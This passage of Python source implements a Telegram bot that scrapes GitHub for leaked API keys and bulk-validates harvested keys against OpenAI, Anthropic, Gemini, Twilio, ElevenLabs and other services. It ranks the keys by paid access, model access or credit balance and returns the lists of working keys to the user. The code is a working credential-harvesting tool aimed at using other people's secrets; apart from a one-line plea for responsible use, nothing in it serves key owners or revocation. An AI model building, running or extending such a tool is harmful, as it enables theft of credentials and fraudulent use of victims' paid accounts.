        # Check if request was successful (valid key with quota)
        if response.status_code == 200:
            # Try to get model list to gather more information
            models_url = f"https://generativelanguage.googleapis.com/v1/models?key={api_key}"
            models_response = requests.get(models_url, timeout=10)
            
            if models_response.status_code == 200:
                models_data = models_response.json()
                models = models_data.get('models', [])
                model_names = [m.get('name', '').split('/')[-1] for m in models]
                
                # Check if it has access to premium models
                has_premium = any(m in ["gemini-1.5-pro", "gemini-1.5-flash"] for m in model_names)
                
                api_details = {
                    "models": model_names,
                    "total_models": len(model_names),
                    "has_premium": has_premium,
                    "status": "active"
                }
            else:
                # Fallback if models endpoint fails
                api_details = {
                    "models": ["gemini-1.5-pro"],
                    "total_models": 1,
                    "has_premium": True,
                    "status": "active"
                }
                
            return (True, None, api_details)
        
        # Check for quota exceeded or rate limit
        elif response.status_code == 429:
            res_json = response.json()
            error_msg = res_json.get("error", {}).get("message", "")
            
            if "exceeded your current quota" in error_msg:
                api_details = {
                    "models": [],
                    "total_models": 0,
                    "has_premium": False,
                    "status": "free_tier"
                }
                return (True, "Valid key but likely free tier or exceeded quota", api_details)
            else:
                return (False, f"Rate limit error: {error_msg}", {})
                
        # Invalid key or other error
        else:
            return (False, f"API error: Status code {response.status_code} - {response.text}", {})
            
    except Exception as e:
        return (False, f"Error checking API key: {str(e)}", {})

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a welcome message with main menu buttons when the command /start is issued."""
    user = update.effective_user
    
    # Create main menu buttons
    keyboard = [
        [InlineKeyboardButton("🔍 Scrape API Keys", callback_data="menu_scrape")],
        [InlineKeyboardButton("🔑 Validate API Keys", callback_data="menu_validate")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"Hello {user.first_name}! I'm the GitHub API Key Scraper & Validator Bot.\n\n"
        "I can help you find API keys accidentally exposed on GitHub and validate API keys.\n\n"
        "Please select an option below:",
        reply_markup=reply_markup
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check the bot status and GitHub API limits."""
    try:
        # Create a scraper to check API limits
        scraper = GitHubAPIScraper(GITHUB_TOKEN)
        
        try:
            rate_limit = scraper.g.get_rate_limit()
            core_limit = rate_limit.core
            search_limit = rate_limit.search
            
            await update.message.reply_text(
                f"Bot Status: Operational ✅\n\n"
                f"GitHub API Rate Limits:\n"
                f"Core: {core_limit.remaining}/{core_limit.limit} requests remaining\n"
                f"Reset at: {core_limit.reset.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Search: {search_limit.remaining}/{search_limit.limit} requests remaining\n"
                f"Reset at: {search_limit.reset.strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except RateLimitExceededException:
            await update.message.reply_text(
                f"Bot Status: Operational ✅\n\n"
                f"⚠️ GitHub API Rate Limit Exceeded!\n"
                f"Please wait before making more requests."
            )
        except UnknownObjectException:
            await update.message.reply_text(
                f"Bot Status: Operational ✅\n\n"
                f"⚠️ GitHub API Error: Unable to access repository.\n"
                f"The repository may be private or have been deleted."
            )
        except Exception as e:
            await update.message.reply_text(
                f"Bot Status: Operational ✅\n\n"
                f"⚠️ GitHub API Error: {str(e)}\n"
                f"The GitHub token may be invalid or expired."
            )
    except Exception as e:
        await update.message.reply_text(f"Error checking status: {str(e)}")

async def scrape(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /scrape command to search for a specific API key."""
    user_id = update.effective_user.id
    
    # Check if the user is already running a search
    if user_id in active_searches and active_searches[user_id]:
        await update.message.reply_text("⚠️ You already have an active search running. Please wait for it to complete.")
        return
    
    # Get the API key name from the command arguments
    if not context.args:
        await update.message.reply_text(
            "⚠️ Please provide an API key name to search for.\n"
            "Example: `/scrape OPENAI_API_KEY`"
        )
        return
    
    api_key_name = ' '.join(context.args)
    
    # Send initial message
    status_message = await update.message.reply_text(f"🔍 Starting search for: {api_key_name}\nThis may take a while...")
    
    # Mark this user as having an active search
    active_searches[user_id] = True
    
    # Call the search function directly
    search_api_keys(update, context, api_key_name, status_message, user_id)

async def scrape_multiple(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /scrape_multiple command to search for multiple API keys."""
    user_id = update.effective_user.id
    
    # Check if the user is already running a search
    if user_id in active_searches and active_searches[user_id]:
        await update.message.reply_text("⚠️ You already have an active search running. Please wait for it to complete.")
        return
    
    # Get the API key names from the command arguments
    if not context.args:
        await update.message.reply_text(
            "⚠️ Please provide comma-separated API key names to search for.\n"
            "Example: `/scrape_multiple TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN`"
        )
        return
    
    api_key_names = ' '.join(context.args)
    if ',' not in api_key_names:
        await update.message.reply_text(
            "⚠️ For multiple keys, please separate them with commas.\n"
            "Example: `/scrape_multiple TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN`"
        )
        return
    
    # Send initial message
    status_message = await update.message.reply_text(f"🔍 Starting search for multiple keys: {api_key_names}\nThis may take a while...")
    
    # Mark this user as having an active search
    active_searches[user_id] = True
    
    # Call the search function directly
    search_api_keys(update, context, api_key_names, status_message, user_id)

def generate_progress_bar(percentage, length=10):
    """Generate a text-based progress bar"""
    completed = int(percentage / 100 * length)
    remaining = length - completed
    return ''.join(['█' * completed, '▒' * remaining])

def search_api_keys(update, context, api_key_name, status_message, user_id):
    """Run the API key search in a separate thread to avoid blocking the bot."""
    print(f"Starting API key search for {api_key_name}")
    print(f"Status message: chat_id={status_message.chat_id}, message_id={status_message.message_id}")
    
    try:
        # Initialize scraper with token
        try:
            scraper = GitHubAPIScraper(GITHUB_TOKEN)
            
            # Check if the GitHub token is valid by making a simple API call
            try:
                # Test the GitHub token with a simple API call
                rate_limit = scraper.g.get_rate_limit()
                print(f"GitHub API rate limits - Core: {rate_limit.core.remaining}/{rate_limit.core.limit}, Search: {rate_limit.search.remaining}/{rate_limit.search.limit}")
            except RateLimitExceededException:
                telegram_edit_message(
                    status_message.chat_id,
                    status_message.message_id,
                    "❌ GitHub API rate limit exceeded. Please try again later."
                )
                active_searches[user_id] = False
                return
            except UnknownObjectException:
                telegram_edit_message(
                    status_message.chat_id,
                    status_message.message_id,
                    "❌ GitHub API error: Unable to access repository. It may be private or deleted."
                )
                active_searches[user_id] = False
                return
            except Exception as e:
                telegram_edit_message(
                    status_message.chat_id,
                    status_message.message_id,
                    f"❌ GitHub API error: {str(e)}. The token may be invalid or expired."
                )
                active_searches[user_id] = False
                return
        except Exception as e:
            telegram_edit_message(
                status_message.chat_id,
                status_message.message_id,
                f"❌ Failed to initialize GitHub API scraper: {str(e)}"
            )
            active_searches[user_id] = False
            return
        
        # Create a status tracking dictionary with more detailed metrics
        status_data = {
            'last_update': None,
            'update_count': 0,
            'last_progress': 0,
            'total_repositories': 0,
            'processed_repositories': 0,
            'valid_keys_found': 0,
            'start_time': time.time(),
            'last_update_time': time.time(),
            'last_message_text': ""  # Track the last message text to avoid duplicates
        }
        
        # Create result file path
        results_file = None
        found_count = 0
        
        def update_status_callback(message, progress=None):
            """Callback function to update status message with enhanced progress information"""
            nonlocal status_data
            
            # Update counters based on message content
            if "Found" in message and "potential matches" in message:
                match = re.search(r"Found (\d+) potential matches", message)
                if match:
                    status_data['total_repositories'] = int(match.group(1))
                    
                    # Force an immediate update for the initial count
                    status_data['last_update_time'] = 0
            
            if "Processing:" in message:
                match = re.search(r"Processing: (\d+)/(\d+)", message)
                if match:
                    status_data['processed_repositories'] = int(match.group(1))
            
            if "Found valid key" in message:
                status_data['valid_keys_found'] += 1
                # Force an update when a key is found
                status_data['last_update_time'] = 0
            
            # Calculate elapsed time and estimated time remaining
            elapsed_time = time.time() - status_data['start_time']
            elapsed_mins = int(elapsed_time // 60)
            elapsed_secs = int(elapsed_time % 60)
            
            eta = "Calculating..."
            if progress and progress > 0.05:  # Only estimate after at least 5% progress
                total_time_est = elapsed_time / progress
                remaining_time = total_time_est - elapsed_time
                eta_mins = int(remaining_time // 60)
                eta_secs = int(remaining_time % 60)
                eta = f"{eta_mins}m {eta_secs}s"
            
            # Don't update the message too frequently (Telegram has rate limits)
            # Update every 5 seconds at most, or on significant events
            current_time = time.time()
            time_since_last_update = current_time - status_data['last_update_time']
            
            should_update = (
                status_data['update_count'] == 0 or  # First update
                time_since_last_update >= 5 or  # At least 5 seconds passed
                (progress is not None and abs(progress - status_data['last_progress']) > 0.1) or  # Progress changed significantly
                "Completed" in message or "Error" in message  # Important event
            )
            
            if should_update:
                print(f"Updating status for search: {api_key_name} - Progress: {progress*100 if progress else 0:.1f}% - Found: {status_data['valid_keys_found']} keys")
                
                # Create a more detailed status message with progress bars
                status_text = f"🔍 Search in progress: {api_key_name}\n\n"
                
                # Repository progress
                if status_data['total_repositories'] > 0:
                    repos_percent = min(100, (status_data['processed_repositories'] / status_data['total_repositories']) * 100)
                    progress_bar = generate_progress_bar(repos_percent)
                    status_text += f"📊 Repository Progress: {repos_percent:.1f}%\n"
                    status_text += f"{progress_bar}\n"
                    status_text += f"📁 Processed: {status_data['processed_repositories']}/{status_data['total_repositories']} repos\n\n"
                
                # Keys found counter
                status_text += f"🔑 Valid Keys Found: {status_data['valid_keys_found']}\n\n"
                
                # Time information
                status_text += f"⏱️ Elapsed: {elapsed_mins}m {elapsed_secs}s\n"
                status_text += f"⏳ ETA: {eta}\n\n"
                
                # Latest status update
                status_text += f"📝 Latest: {message}"
                
                # Check if the message text is different from the last one
                if status_text != status_data['last_message_text']:
                    # Use direct Telegram API to update the message
                    result = telegram_edit_message(
                        status_message.chat_id,
                        status_message.message_id,
                        status_text
                    )
                    
                    if result:
                        print(f"Message updated successfully")
                        status_data['last_message_text'] = status_text
                    else:
                        print(f"Failed to update message")
                else:
                    print(f"Skipping update - message unchanged for {api_key_name}")
                
                # Update state
                status_data['last_update'] = message
                status_data['last_progress'] = progress if progress is not None else status_data['last_progress']
                status_data['last_update_time'] = current_time
            
            status_data['update_count'] += 1
        
        def complete_callback(file_path, key_count):
            """Callback function when search is complete"""
            nonlocal results_file, found_count
            results_file = file_path
            found_count = key_count
        
        # Start the search
        scraper.search_api_keys(
            api_key_name, 
            update_callback=update_status_callback,
            complete_callback=complete_callback
        )
        
        # When search is complete, send the results file
        if results_file and os.path.exists(results_file) and found_count > 0:
            # Calculate total elapsed time
            total_time = time.time() - status_data['start_time']
            mins = int(total_time // 60)
            secs = int(total_time % 60)
            
            # Final status update
            final_text = f"✅ Search completed for: {api_key_name}\n\n"
            final_text += f"Found {found_count} {'unique credential sets' if ',' in api_key_name else 'valid API keys'}\n"
            final_text += f"Processed {status_data['processed_repositories']} repositories\n"
            final_text += f"Total time: {mins}m {secs}s"
            
            print(f"Search completed: {api_key_name} - Found: {found_count} keys")
            
            # Update final status using direct API
            telegram_edit_message(
                status_message.chat_id,
                status_message.message_id,
                final_text
            )
            
            # Send the file using direct API
            telegram_send_document(
                status_message.chat_id,
                results_file,
                f"📁 Results for {api_key_name} ({found_count} items found)"
            )
        else:
            # No results or error
            total_time = time.time() - status_data['start_time']
            mins = int(total_time // 60)
            secs = int(total_time % 60)
            
            error_text = f"❌ No valid keys found for: {api_key_name}\n"
            error_text += f"Processed {status_data['processed_repositories']} repositories\n"
            error_text += f"Total time: {mins}m {secs}s"
            
            print(f"Search completed with no results: {api_key_name}")
            
            # Update final status using direct API
            telegram_edit_message(
                status_message.chat_id,
                status_message.message_id,
                error_text
            )
    
    except Exception as e:
        # Handle any exceptions
        error_message = f"❌ An error occurred: {str(e)}"
        print(f"Search error: {str(e)}")
        
        # Send error message using direct API
        telegram_edit_message(
            status_message.chat_id,
            status_message.message_id,
            error_message
        )
    
    finally:
        # Mark search as completed for this user if not already done
        active_searches[user_id] = False
        print(f"Search thread finished for: {api_key_name}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a detailed help message when the command /help is issued."""
    await update.message.reply_text(
        "💡 GitHub API Key Scraper & Validator Bot Help:\n\n"
        "This bot has two main functions:\n"
        "1. Search GitHub for exposed API keys\n"
        "2. Validate API keys for various services in bulk\n\n"
        
        "📌 *GitHub API Scraper Commands:*\n"
        "/scrape <key_name> - Search for a specific API key\n"
        "  Example: `/scrape OPENAI_API_KEY`\n\n"
        "/scrape_multiple <key1,key2,...> - Search for multiple keys\n"
        "  Example: `/scrape_multiple TWILIO_SID,TWILIO_TOKEN`\n"
        "  Results will be saved in KEY1:KEY2:KEY3 format\n\n"
        "/status - Check bot status and GitHub API rate limits\n\n"
        
        "🔑 *API Key Validator Commands:*\n"
        "/bulk_validate - Validate multiple API keys from a text file\n"
        "  Upload a .txt file with one API key per line\n"
        "  Then select the API type from the buttons\n"
        "  Supported types: OpenAI, Eleven Labs, Anthropic, Twilio, Grok, Gemini, RunwayML\n\n"
        "/bulk_validate_help - Show detailed instructions for bulk validation\n\n"
        
        "Please use this tool responsibly and ethically."
    )

async def bulk_validate_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send instructions for bulk validation."""
    help_text = (
        "📌 *Bulk API Key Validation Help*\n\n"
        "To validate multiple API keys at once, upload a text file with one API key per line "
        "and then select which API type to validate from the buttons.\n\n"
        
        "Supported API types:\n"
        "• OpenAI - Validate OpenAI API keys\n"
        "• Eleven Labs - Check Eleven Labs API keys\n"
        "• Anthropic - Validate Anthropic API keys\n"
        "• Twilio - Validate Twilio credentials (format: SID:TOKEN)\n"
        "• Grok - Validate Grok API keys\n"
        "• Gemini - Validate Gemini API keys\n"
        "• RunwayML - Validate RunwayML API keys\n\n"
        
        "The bot will process all keys in the file and provide a result file with details about each key.\n\n"
        
        "Example usage:\n"
        "1. Type `/bulk_validate`\n"
        "2. Upload a .txt file with API keys (one per line)\n"
        "3. Select the API type from the buttons that appear\n\n"
        
        "Alternatively, you can first upload a file and then reply to it with the `/bulk_validate` command."
    )
    
    await update.message.reply_text(help_text)

async def bulk_validate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle bulk validation command."""
    # Check if it's a reply to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        # The command is replying to a file, show API type selection buttons
        file = update.message.reply_to_message.document
        if not file.file_name.endswith('.txt'):
            await update.message.reply_text("Please reply to a .txt file.")
            return
        
        # Generate a unique cache key for this file
        cache_key = f"file_{int(time.time())}_{update.effective_user.id}"
        file_cache[cache_key] = file.file_id
        
        # Create inline keyboard with API type options
        keyboard = [
            [
                InlineKeyboardButton("OpenAI", callback_data=f"val_openai_{cache_key}"),
                InlineKeyboardButton("Eleven Labs", callback_data=f"val_elevenlabs_{cache_key}")
            ],
            [
                InlineKeyboardButton("Anthropic", callback_data=f"val_anthropic_{cache_key}"),
                InlineKeyboardButton("Twilio", callback_data=f"val_twilio_{cache_key}")
            ],
            [
                InlineKeyboardButton("Grok", callback_data=f"val_grok_{cache_key}"),
                InlineKeyboardButton("Gemini", callback_data=f"val_gemini_{cache_key}")
            ],
            [
                InlineKeyboardButton("RunwayML", callback_data=f"val_runwayml_{cache_key}"),
                InlineKeyboardButton("MiniMax", callback_data=f"val_minimax_{cache_key}")
            ],
            [
                InlineKeyboardButton("Perplexity", callback_data=f"val_perplexity_{cache_key}"),
                InlineKeyboardButton("AIML", callback_data=f"val_aiml_{cache_key}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📋 Please select which API type to validate:",
            reply_markup=reply_markup
        )
    else:
        # Instruct the user to upload a file first
        await update.message.reply_text(
            "Please upload a text file with your API keys (one per line).\n"
            "You can either:\n"
            "1. First upload the file, then reply to it with `/bulk_validate`\n"
            "2. Type `/bulk_validate` and then upload the file"
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks for menu navigation and API validation type selection."""
    query = update.callback_query
    # Call answer to acknowledge the button press
    await query.answer()
    
    # Get callback data
    callback_data = query.data
    
    # Handle main menu selections
    if callback_data == "menu_scrape":
        # Show scraping options
        keyboard = [
            [InlineKeyboardButton("🔍 Scrape Single API Key", callback_data="scrape_single")],
            [InlineKeyboardButton("🔍 Scrape Multiple API Keys", callback_data="scrape_multiple")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="menu_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📌 *GitHub API Key Scraper*\n\n"
            "Please select which type of scraping you would like to perform:",
            reply_markup=reply_markup
        )
    
    elif callback_data == "menu_validate":
        # Show validation options
        keyboard = [
            [
                InlineKeyboardButton("OpenAI", callback_data="validate_openai"),
                InlineKeyboardButton("Eleven Labs", callback_data="validate_elevenlabs")
            ],
            [
                InlineKeyboardButton("Anthropic", callback_data="validate_anthropic"),
                InlineKeyboardButton("Twilio", callback_data="validate_twilio")
            ],
            [
                InlineKeyboardButton("Grok", callback_data="validate_grok"),
                InlineKeyboardButton("Gemini", callback_data="validate_gemini")
            ],
            [
                InlineKeyboardButton("RunwayML", callback_data="validate_runwayml"),
                InlineKeyboardButton("MiniMax", callback_data="validate_minimax")
            ],
            [
                InlineKeyboardButton("Perplexity", callback_data="validate_perplexity"),
                InlineKeyboardButton("AIML", callback_data="validate_aiml")
            ],
            [
                InlineKeyboardButton("🔙 Back to Main Menu", callback_data="menu_main")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔑 *API Key Validator*\n\n"
            "Please select which type of API keys you want to validate:",
            reply_markup=reply_markup
        )
    
    elif callback_data == "menu_main":
        # Return to main menu
        keyboard = [
            [InlineKeyboardButton("🔍 Scrape API Keys", callback_data="menu_scrape")],
            [InlineKeyboardButton("🔑 Validate API Keys", callback_data="menu_validate")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "Main Menu\n\n"
            "Please select an option below:",
            reply_markup=reply_markup
        )
    
    # Handle scraping options
    elif callback_data == "scrape_single":
        # Store the user's selection in chat_data
        context.chat_data["scrape_mode"] = "single"
        
        await query.edit_message_text(
            "🔍 *Scrape Single API Key*\n\n"
            "Please enter the API key name you want to search for.\n"
            "Example: `OPENAI_API_KEY`"
        )
    
    elif callback_data == "scrape_multiple":
        # Store the user's selection in chat_data
        context.chat_data["scrape_mode"] = "multiple"
        
        await query.edit_message_text(
            "🔍 *Scrape Multiple API Keys*\n\n"
            "Please enter the comma-separated API key names you want to search for.\n"
            "Example: `TWILIO_SID,TWILIO_TOKEN`"
        )
    
    # Handle validation type selection
    elif callback_data.startswith("validate_"):
        validation_type = callback_data.split("_")[1]
        # Store the selected validation type in chat_data
        context.chat_data["validation_type"] = validation_type
        
        await query.edit_message_text(
            f"🔑 *{validation_type.capitalize()} API Key Validation*\n\n"
            f"Please upload a .txt file containing your {validation_type.capitalize()} API keys.\n"
            "The file should have one API key per line."
        )
    
    # Handle file validation from cache
    elif callback_data.startswith("val_"):
        # Parse the callback data to get validation type and cache key
        # Format: val_type_cachekey
        data_parts = callback_data.split('_', 2)
        if len(data_parts) != 3 or data_parts[0] != "val":
            await query.edit_message_text("Invalid selection. Please try again.")
            return
        
        validation_type = data_parts[1]
        cache_key = data_parts[2]
        
        # Get the file ID from the cache
        if cache_key not in file_cache:
            await query.edit_message_text("File reference expired. Please upload the file again.")
            return
        
        file_id = file_cache[cache_key]
        
        # Update the message to show processing
        status_message = await query.edit_message_text(
            f"📋 Processing file for bulk {validation_type} validation...\n"
            "This may take some time depending on the number of API keys."
        )
        
        try:
            # Get the file
            new_file = await context.bot.get_file(file_id)
            
            # Download the file content
            file_content = await new_file.download_as_bytearray()
            content = file_content.decode('utf-8')
            
            # Split the content into lines
            api_keys = [line.strip() for line in content.splitlines() if line.strip()]
            
            # Call the validation function directly
            process_bulk_validation(update, api_keys, validation_type, status_message)
            
            # Clean up the cache entry
            if cache_key in file_cache:
                del file_cache[cache_key]
                
        except Exception as e:
            await query.edit_message_text(f"Error processing file: {str(e)}")
            
            # Clean up the cache entry on error
            if cache_key in file_cache:
                del file_cache[cache_key]

# For handling messages with commands
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle regular messages that might contain commands in response to menu selections."""
    # Check if we're waiting for specific input based on previous menu selections
    if "scrape_mode" in context.chat_data:
        scrape_mode = context.chat_data["scrape_mode"]
        
        # Remove the mode to prevent handling the same command twice
        del context.chat_data["scrape_mode"]
        
        if scrape_mode == "single":
            # Process as single API key scrape
            api_key_name = update.message.text.strip()
            
            # Send initial message
            status_message = await update.message.reply_text(
                f"🔍 Starting search for: {api_key_name}\nThis may take a while..."
            )
            
            # Mark this user as having an active search
            user_id = update.effective_user.id
            active_searches[user_id] = True
            
            # Call the search function directly
            search_api_keys(update, context, api_key_name, status_message, user_id)
            
        elif scrape_mode == "multiple":
            # Process as multiple API key scrape
            api_key_names = update.message.text.strip()
            
            if ',' not in api_key_names:
                await update.message.reply_text(
                    "⚠️ For multiple keys, please separate them with commas.\n"
                    "Example: `TWILIO_ACCOUNT_SID,TWILIO_AUTH_TOKEN`"
                )
                return
            
            # Send initial message
            status_message = await update.message.reply_text(
                f"🔍 Starting search for multiple keys: {api_key_names}\nThis may take a while..."
            )
            
            # Mark this user as having an active search
            user_id = update.effective_user.id
            active_searches[user_id] = True
            
            # Call the search function directly
            search_api_keys(update, context, api_key_names, status_message, user_id)
    else:
        # Handle as regular message
        await update.message.reply_text(
            "Please use the /start command to access the menu, or use specific commands like /help."
        )

# For handling file uploads for validation
async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Process a text file with API keys for bulk validation."""
    if not update.message.document:
        await update.message.reply_text("Please upload a text file with API keys.")
        return
    
    # Check if the file is a text file
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        await update.message.reply_text("Please upload a .txt file.")
        return
    
    # Check if we have a validation type stored in chat_data
    if "validation_type" in context.chat_data:
        validation_type = context.chat_data["validation_type"]
        # Clear the stored validation type
        del context.chat_data["validation_type"]
        
        # Send initial message
        status_message = await update.message.reply_text(
            f"📋 Processing file for bulk {validation_type} validation...\n"
            "This may take some time depending on the number of API keys."
        )
        
        try:
            # Get the file
            new_file = await context.bot.get_file(file.file_id)
            
            # Download the file content
            file_content = await new_file.download_as_bytearray()
            content = file_content.decode('utf-8')
            
            # Split the content into lines
            api_keys = [line.strip() for line in content.splitlines() if line.strip()]
            
            # Call the validation function directly
            process_bulk_validation(update, api_keys, validation_type, status_message)
        except Exception as e:
            await update.message.reply_text(f"Error processing file: {str(e)}")
    else:
        # If no validation type is stored, show all validation options
        # Generate a unique cache key for this file
        cache_key = f"file_{int(time.time())}_{update.effective_user.id}"
        file_cache[cache_key] = file.file_id
        
        # Create inline keyboard with API type options
        keyboard = [
            [
                InlineKeyboardButton("OpenAI", callback_data=f"val_openai_{cache_key}"),
                InlineKeyboardButton("Eleven Labs", callback_data=f"val_elevenlabs_{cache_key}")
            ],
            [
                InlineKeyboardButton("Anthropic", callback_data=f"val_anthropic_{cache_key}"),
                InlineKeyboardButton("Twilio", callback_data=f"val_twilio_{cache_key}")
            ],
            [
                InlineKeyboardButton("Grok", callback_data=f"val_grok_{cache_key}"),
                InlineKeyboardButton("Gemini", callback_data=f"val_gemini_{cache_key}")
            ],
            [
                InlineKeyboardButton("RunwayML", callback_data=f"val_runwayml_{cache_key}"),
                InlineKeyboardButton("MiniMax", callback_data=f"val_minimax_{cache_key}")
            ],
            [
                InlineKeyboardButton("Perplexity", callback_data=f"val_perplexity_{cache_key}"),
                InlineKeyboardButton("AIML", callback_data=f"val_aiml_{cache_key}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📋 Please select which API type to validate:",
            reply_markup=reply_markup
        )

def process_bulk_validation(update, api_keys, validation_type, status_message):
    """Process bulk validation of API keys from a file."""
    try:
        # Create a unique filename for the results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = os.path.join(BATCH_RESULTS_FOLDER, f"valid_{validation_type}_{timestamp}.txt")
        
        # Update the status message
        telegram_edit_message(
            status_message.chat_id,
            status_message.message_id,
            f"🔍 Processing {len(api_keys)} keys for {validation_type} validation...\n"
            f"0% complete"
        )
        
        # Create lists to store valid keys and their details
        special_keys_list = []  # For premium/paid accounts
        regular_keys_list = []  # For normal valid accounts
        valid_keys_count = 0
        special_keys_count = 0
        
        # Process each key
        for i, api_key in enumerate(api_keys, 1):
            try:
                # Skip empty lines
                if not api_key.strip():
                    continue
                
                # Validate the key based on the validation type
                is_valid = False
                is_special = False
                status_text = "❌ INVALID"
                details = {}
                
                if validation_type == "openai":
                    is_valid, error, details = check_openai_valid(api_key)
                    if is_valid:
                        if details.get("status") == "quota_exceeded":
                            status_text = "⚠️ VALID (QUOTA EXCEEDED)"
                        else:
                            status_text = "✅ VALID"
                            if details.get("has_gpt4", False):
                                is_special = True
                                status_text += " (GPT-4 ACCESS)"
                
                elif validation_type == "elevenlabs":
                    is_premium, character_limit, error, usage_details = check_eleven_premium(api_key)
                    is_valid = (error is None)
                    if is_valid:
                        status_text = "✅ VALID"
                        if is_premium:
                            is_special = True
                            status_text += f" (PREMIUM - {character_limit:,} chars)"
                        else:
                            status_text += f" (FREE - {character_limit:,} chars)"
                        details = usage_details
                
                elif validation_type == "anthropic":
                    is_valid, error, details = check_anthropic_valid(api_key)
                    if is_valid:
                        if details.get("status") == "credit_insufficient":
                            status_text = "⚠️ VALID (INSUFFICIENT CREDIT)"
                        else:
                            status_text = "✅ VALID"
                            if details.get("has_claude3", False):
                                is_special = True
                                status_text += " (CLAUDE-3 ACCESS)"
                
                elif validation_type == "twilio":
                    is_valid, error, details = check_twilio_valid(api_key)
                    if is_valid:
                        status_text = "✅ VALID"
                        account_type = details.get("type", "").lower()
                        if account_type != "trial":
                            is_special = True
                            status_text += " (FULL ACCOUNT)"
                
                elif validation_type == "grok":
                    is_valid, error, details = check_grok_valid(api_key)
                    if is_valid:
                        if details.get("status") == "quota_exceeded":
                            status_text = "⚠️ VALID (QUOTA EXCEEDED)"
                        else:
                            status_text = "✅ VALID"
                
                elif validation_type == "gemini":
                    is_valid, error, details = check_gemini_valid(api_key)
                    if is_valid:
                        if details.get("status") == "free_tier":
                            status_text = "⚠️ VALID (FREE TIER)"
                        else:
                            status_text = "✅ VALID"
                            if details.get("has_premium", False):
                                is_special = True
                                status_text += " (PREMIUM ACCESS)"
                
                elif validation_type == "runwayml":
                    is_valid, error, details = check_runwayml_valid(api_key)
                    if is_valid:
                        if details.get("status") == "no_billing":
                            status_text = "⚠️ VALID (NO BILLING)"
                        else:
                            status_text = "✅ VALID"
                            credit_balance = details.get('credit_balance', 0)
                            if credit_balance > 0:
                                is_special = True
                                status_text += f" (CREDITS: {credit_balance})"
                
                elif validation_type == "minimax":
                    is_valid, error, details = check_minimax_valid(api_key)
                    if is_valid:
                        status_text = "✅ VALID"
                        # Check if we have user details from JWT
                        if details.get("user_name") != "Unknown":
                            is_special = True
                            status_text += f" (ACCOUNT: {details.get('user_name')})"
                
                elif validation_type == "perplexity":
                    is_valid, error, details = check_perplexity_valid(api_key)
                    if is_valid:
                        if details.get("status") == "rate_limited":
                            status_text = "⚠️ VALID (RATE LIMITED)"
                        else:
                            status_text = "✅ VALID"
                            if details.get("has_pro", False):
                                is_special = True
                                status_text += " (PRO ACCESS)"
                
                elif validation_type == "aiml":
                    is_valid, error, details = check_aiml_valid(api_key)
                    if is_valid:
                        if details.get("status") == "rate_limited":
                            status_text = "⚠️ VALID (RATE LIMITED)"
                        else:
                            status_text = "✅ VALID"
                
                # Count valid keys and store them for later sorting
                if is_valid:
                    valid_keys_count += 1
                    
                    # Create a dictionary with key information
                    key_info = {
                        "api_key": api_key,
                        "status_text": status_text,
                        "details": details,
                        "validation_type": validation_type
                    }
                    
                    # Add to appropriate list based on special status
                    if is_special:
                        special_keys_count += 1
                        special_keys_list.append(key_info)
                    else:
                        regular_keys_list.append(key_info)
                
                # Update status message periodically (every 5 keys or at the end)
                if i % 5 == 0 or i == len(api_keys):
                    progress_percent = (i / len(api_keys)) * 100
                    telegram_edit_message(
                        status_message.chat_id,
                        status_message.message_id,
                        f"🔍 Processing {len(api_keys)} keys for {validation_type} validation...\n"
                        f"Progress: {progress_percent:.1f}% complete\n"
                        f"Valid keys found: {valid_keys_count} (Special: {special_keys_count})"
                    )
            
            except Exception as e:
                # Log error but continue processing
                print(f"Error processing key {i}: {str(e)}")
                # No longer writing invalid keys to the file
        
        # If no valid keys were found, show a specific message
        if valid_keys_count == 0:
            telegram_edit_message(
                status_message.chat_id,
                status_message.message_id,
                f"❌ No valid {validation_type} API keys found.\n"
                f"Processed {len(api_keys)} keys."
            )
            # Delete the empty file
            if os.path.exists(results_file):
                os.remove(results_file)
            return
        
        # Write results to file with special keys first, then regular keys
        with open(results_file, 'w', encoding='utf-8') as f:
            f.write(f"# Valid {validation_type.upper()} API Keys\n")
            f.write(f"# Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # Write special premium keys first
            if special_keys_list:
                f.write("=============== SPECIAL/PREMIUM KEYS ===============\n\n")
                for key_info in special_keys_list:
                    f.write(f"Key: {key_info['api_key']}\n")
                    f.write(f"Status: {key_info['status_text']}\n")
                    
                    # Add additional details based on validation type
                    if validation_type == "openai" and key_info['details'].get("status") != "quota_exceeded":
                        f.write(f"Account Type: {'Paid' if key_info['details'].get('has_gpt4', False) else 'Free'}\n")
                        f.write(f"Available Models: {', '.join(key_info['details'].get('models', [])[:3])}\n")
                    
                    elif validation_type == "elevenlabs":
                        f.write(f"Character Limit: {key_info['details'].get('character_limit', 0):,}\n")
                        f.write(f"Characters Used: {key_info['details'].get('character_count', 0):,}\n")
